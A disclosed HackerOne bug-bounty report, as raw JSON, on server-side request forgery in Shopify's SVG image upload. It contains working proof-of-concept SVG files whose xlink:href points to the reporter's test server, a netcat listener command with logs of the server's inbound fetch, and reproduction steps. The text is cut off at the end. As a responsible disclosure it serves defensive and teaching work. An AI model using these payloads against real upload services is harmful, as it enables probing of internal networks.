{"id":97501,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NzUwMQ==","url":"https://hackerone.com/reports/97501","title":"SVG parser loads external resources on image upload","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-11-03T20:09:47.070Z","submitted_at":"2015-11-03T20:09:47.070Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ogig","url":"/ogig","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/042/869/3bcd27442933619d80c7366ed880ee1a9ede08f8_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-06-02T12:57:44.031Z","bug_reporter_agreed_on_going_public_at":"2016-06-02T12:57:43.874Z","team_member_agreed_on_going_public_at":"2016-05-31T18:27:11.195Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Uploading SVG that include\n\n```\n \u003cimage xlink:href=\"http://example.com/?evil=var\" /\u003e\n```\n\nwill cause the server side parser to try to fetch external resources.\n\nI've tested in two ways. Creating an svg with an external loaded public google image that was rendered perfectly. \n\nAlso tested a private server with nc and created an svg that uses xlink for private url. I uploaded the svg and nc output was this. \n\n```\nListening on [0.0.0.0] (family 0, port 3001)\nConnection from [23.227.55.103] port 3001 [tcp/*] accepted (family 2, sport 49391)\nGET /?evil=var HTTP/1.0\nHost: 37.139.18.151:3001\nAccept-Encoding: gzip\n```","vulnerability_information_html":"\u003cp\u003eUploading SVG that include\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e \u0026lt;image xlink:href=\u0026quot;http://example.com/?evil=var\u0026quot; /\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewill cause the server side parser to try to fetch external resources.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve tested in two ways. Creating an svg with an external loaded public google image that was rendered perfectly. \u003c/p\u003e\n\n\u003cp\u003eAlso tested a private server with nc and created an svg that uses xlink for private url. I uploaded the svg and nc output was this. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eListening on [0.0.0.0] (family 0, port 3001)\nConnection from [23.227.55.103] port 3001 [tcp/*] accepted (family 2, sport 49391)\nGET /?evil=var HTTP/1.0\nHost: 37.139.18.151:3001\nAccept-Encoding: gzip\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":8,"voters":["dejavuln","silv3rpoision","pacmanx","zeroknife","armansameer","dyabla","fidizi","guanart"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":643468,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"I don't have enough information to reproduce this issue here. Please send all necessary step by step instruction for us to reproduce the issue, for the two ways that you mentioned in your description.","markdown_message":"\u003cp\u003eI don\u0026#39;t have enough information to reproduce this issue here. Please send all necessary step by step instruction for us to reproduce the issue, for the two ways that you mentioned in your description.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-03T21:06:15.578Z","updated_at":"2015-11-03T21:06:15.578Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":643625,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Step by step:\n\n- Prepare svg file with xlink. Below is the exact file I used, it contains tags that might not be need to trigger the fetch. Important bit is `xlink:href` at image tag. Replace http://37.139.18.xxx:3001/?evil=var for a external resource you want to hit. 37.139.18.xxx:3001 is just my testing server.\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\n\u003csvg\n   xmlns:dc=\"http://purl.org/dc/elements/1.1/\"\n   xmlns:cc=\"http://creativecommons.org/ns#\"\n   xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"\n   xmlns:svg=\"http://www.w3.org/2000/svg\"\n   xmlns=\"http://www.w3.org/2000/svg\"\n   xmlns:xlink=\"http://www.w3.org/1999/xlink\"\n   xmlns:sodipodi=\"http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd\"\n   xmlns:inkscape=\"http://www.inkscape.org/namespaces/inkscape\"\n   style=\"overflow: hidden; position: relative;\"\n   width=\"300\"\n   version=\"1.1\"\n   height=\"200\"\n   id=\"svg3202\"\n   inkscape:version=\"0.48.4 r9939\"\n   sodipodi:docname=\"googleExt.svg\"\u003e\n  \u003cmetadata\n     id=\"metadata3212\"\u003e\n    \u003crdf:RDF\u003e\n      \u003ccc:Work\n         rdf:about=\"\"\u003e\n        \u003cdc:format\u003eimage/svg+xml\u003c/dc:format\u003e\n        \u003cdc:type\n           rdf:resource=\"http://purl.org/dc/dcmitype/StillImage\" /\u003e\n      \u003c/cc:Work\u003e\n    \u003c/rdf:RDF\u003e\n  \u003c/metadata\u003e\n  \u003cdefs\n     id=\"defs3210\" /\u003e\n  \u003csodipodi:namedview\n     pagecolor=\"#ffffff\"\n     bordercolor=\"#666666\"\n     borderopacity=\"1\"\n     objecttolerance=\"10\"\n     gridtolerance=\"10\"\n     guidetolerance=\"10\"\n     inkscape:pageopacity=\"0\"\n     inkscape:pageshadow=\"2\"\n     inkscape:window-width=\"640\"\n     inkscape:window-height=\"480\"\n     id=\"namedview3208\"\n     showgrid=\"false\"\n     inkscape:zoom=\"1.0666667\"\n     inkscape:cx=\"150\"\n     inkscape:cy=\"100\"\n     inkscape:window-x=\"49\"\n     inkscape:window-y=\"24\"\n     inkscape:window-maximized=\"0\"\n     inkscape:current-layer=\"svg3202\" /\u003e\n  \u003cimage\n     x=\"10\"\n     y=\"10\"\n     width=\"276\"\n     height=\"110\"\n     xlink:href=\"http://37.139.18.151:3001/?evil=var\"\n     stroke-width=\"1\"\n     id=\"image3204\" /\u003e\n  \u003crect\n     x=\"0\"\n     y=\"150\"\n     height=\"10\"\n     width=\"300\"\n     style=\"fill: #000000\"\n     id=\"rect3206\" /\u003e\n\u003c/svg\u003e\n```\n\n- On the test server, just for logging purposes:\n\n```\nroot@whtest:/opt/mean# netcat -l -p 3001 -v\nListening on [0.0.0.0] (family 0, port 3001)\n```\n\n- Upload .svg file to product sheet. On the test server you can see the hit.\n\n```\nConnection from [23.227.55.111] port 3001 [tcp/*] accepted (family 2, sport 56279)\nGET /?evil=var HTTP/1.0\nHost: 37.139.18.151:3001\nAccept-Encoding: gzip\n```\n\nIf you replace the xlink:href for a public image, (i used: http://images.google.com/intl/es_ALL/images/logos/images_logo_lg.gif), the svg parser will fetch the image and output a png with the google logo.\n","markdown_message":"\u003cp\u003eStep by step:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ePrepare svg file with xlink. Below is the exact file I used, it contains tags that might not be need to trigger the fetch. Important bit is \u003ccode\u003exlink:href\u003c/code\u003e at image tag. Replace \u003ca title=\"http://37.139.18.xxx:3001/?evil=var\" href=\"/redirect?url=http%3A%2F%2F37.139.18.xxx%3A3001%2F%3Fevil%3Dvar\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://37.139.18.xxx:3001/?evil=var\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e for a external resource you want to hit. 37.139.18.xxx:3001 is just my testing server.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; standalone=\u0026quot;no\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;svg\u003c/span\u003e\n   \u003cspan class=\"na\"\u003exmlns:dc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://purl.org/dc/elements/1.1/\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003exmlns:cc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://creativecommons.org/ns#\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003exmlns:rdf=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/1999/02/22-rdf-syntax-ns#\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003exmlns:svg=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003exmlns:xlink=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/1999/xlink\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003exmlns:sodipodi=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003exmlns:inkscape=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.inkscape.org/namespaces/inkscape\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;overflow: hidden; position: relative;\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;300\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003eversion=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1.1\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;svg3202\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003einkscape:version=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0.48.4 r9939\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003esodipodi:docname=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;googleExt.svg\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;metadata\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;metadata3212\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;rdf:RDF\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;cc:Work\u003c/span\u003e\n         \u003cspan class=\"na\"\u003erdf:about=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;dc:format\u0026gt;\u003c/span\u003eimage/svg+xml\u003cspan class=\"nt\"\u003e\u0026lt;/dc:format\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;dc:type\u003c/span\u003e\n           \u003cspan class=\"na\"\u003erdf:resource=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://purl.org/dc/dcmitype/StillImage\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;/cc:Work\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/rdf:RDF\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/metadata\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;defs\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;defs3210\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;sodipodi:namedview\u003c/span\u003e\n     \u003cspan class=\"na\"\u003epagecolor=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;#ffffff\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ebordercolor=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;#666666\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eborderopacity=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eobjecttolerance=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003egridtolerance=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eguidetolerance=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003einkscape:pageopacity=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003einkscape:pageshadow=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003einkscape:window-width=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;640\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003einkscape:window-height=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;480\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;namedview3208\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eshowgrid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;false\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003einkscape:zoom=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1.0666667\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003einkscape:cx=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;150\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003einkscape:cy=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;100\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003einkscape:window-x=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;49\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003einkscape:window-y=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;24\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003einkscape:window-maximized=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003einkscape:current-layer=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;svg3202\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;image\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;276\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;110\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003exlink:href=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://37.139.18.151:3001/?evil=var\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003estroke-width=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;image3204\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;rect\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;150\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;300\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;fill: #000000\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;rect3206\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/svg\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eOn the test server, just for logging purposes:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@whtest:/opt/mean# netcat -l -p 3001 -v\nListening on [0.0.0.0] (family 0, port 3001)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eUpload .svg file to product sheet. On the test server you can see the hit.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eConnection from [23.227.55.111] port 3001 [tcp/*] accepted (family 2, sport 56279)\nGET /?evil=var HTTP/1.0\nHost: 37.139.18.151:3001\nAccept-Encoding: gzip\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf you replace the xlink:href for a public image, (i used: \u003ca title=\"http://images.google.com/intl/es_ALL/images/logos/images_logo_lg.gif\" href=\"/redirect?url=http%3A%2F%2Fimages.google.com%2Fintl%2Fes_ALL%2Fimages%2Flogos%2Fimages_logo_lg.gif\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://images.google.com/intl/es_ALL/images/logos/images_logo_lg.gif\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), the svg parser will fetch the image and output a png with the google logo.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-03T23:14:26.568Z","updated_at":"2015-11-03T23:14:26.568Z","actor":{"username":"ogig","cleared":false,"url":"/ogig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/869/3bcd27442933619d80c7366ed880ee1a9ede08f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":643664,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just noticed a Markdown parsing error in this line of the svg file:\n```\nstyle=\"fill: #000000\"\n```\nshould be:\nstyle=\"fill: #000000\"\n\nAlso, just to clarify; this is a SSRF issue.\nhttps://cwe.mitre.org/data/definitions/918.html ","markdown_message":"\u003cp\u003eJust noticed a Markdown parsing error in this line of the svg file:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003estyle=\u0026quot;fill: #000000\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eshould be:\u003cbr\u003e\nstyle=\u0026quot;fill: \u003ca href=\"/reports/000000\"\u003e#000000\u003c/a\u003e\u0026quot;\u003c/p\u003e\n\n\u003cp\u003eAlso, just to clarify; this is a SSRF issue.\u003cbr\u003e\n\u003ca title=\"https://cwe.mitre.org/data/definitions/918.html\" href=\"/redirect?url=https%3A%2F%2Fcwe.mitre.org%2Fdata%2Fdefinitions%2F918.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cwe.mitre.org/data/definitions/918.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-03T23:46:45.174Z","updated_at":"2015-11-03T23:46:45.174Z","actor":{"username":"ogig","cleared":false,"url":"/ogig","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/042/869/3bcd27442933619d80c7366ed880ee1a9ede08f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":643707,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Excuse the Inkscape file mess before. Here is a cleaned up version of the .svg file that fetches a public image at google.\n\n- Save this as .svg\n\n```\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\n\u003csvg\n   xmlns:svg=\"http://www.w3.org/2000/svg\"\n   xmlns=\"http://www.w3.org/2000/svg\"\n   xmlns:xlink=\"http://www.w3.org/1999/xlink\"\n   style=\"overflow: hidden; position: relative;\"\n   width=\"300\"\n   height=\"200\"\u003e\n\n  \u003cimage\n     x=\"10\"\n     y=\"10\"\n     width=\"276\"\n     height=\"110\"\n     xlink:href=\"http://images.google.com/intl/es_ALL/images/logos/images_logo_lg.gif\"\n     stroke-width=\"1\"\n     id=\"image3204\" /\u003e\n  \u003crect\n     x=\"0\"\n     y=\"150\"\n     height=\"10\"\n     width=\"300\"\n     style=\"fill: black\"/\u003e\n\u003c/svg\u003e\n```\n\n- Create/save a product\n\n- Add image uploading the .svg\n\n_What happens_\nServer reads href, fetches the document from google in the context of the svg server side parser program, leading to SSRF and possibly other vectors.\n\n_What should happen_\nServer refuses to process svg or aggressively sanitizes xlink, xmlns, xlst, DTD and other XML attack vectors.\n\nLet me know if you need something else.","markdown_message":"\u003cp\u003eExcuse the Inkscape file mess before. Here is a cleaned up version of the .svg file that fetches a public image at google.\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eSave this as .svg\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; standalone=\u0026quot;no\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;svg\u003c/span\u003e\n   \u003cspan class=\"na\"\u003exmlns:svg=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003exmlns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003exmlns:xlink=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://www.w3.org/1999/xlink\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;overflow: hidden; position: relative;\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;300\u0026quot;\u003c/span\u003e\n   \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;200\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\n  \u003cspan class=\"nt\"\u003e\u0026lt;image\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;276\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;110\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003exlink:href=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://images.google.com/intl/es_ALL/images/logos/images_logo_lg.gif\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003estroke-width=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;image3204\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;rect\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;150\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003eheight=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003ewidth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;300\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;fill: black\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/svg\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eCreate/save a product\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eAdd image uploading the .svg\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003cu\u003eWhat happens\u003c/u\u003e\u003cbr\u003e\nServer reads href, fetches the document from google in the context of the svg server side parser program, leading to SSRF and possibly other vectors.\u003c/p\u003e\n\n\u003cp\u003e\u003cu\u003eWhat should happen\u003c/u\u003e\u003cbr\u003e\nServer refuses to process svg or aggressively sanitizes xlink, xmlns, xlst, DTD and other XML attack vectors.\u003c/p\u003e\n\n\u003cp\u003eLet me know if you need something 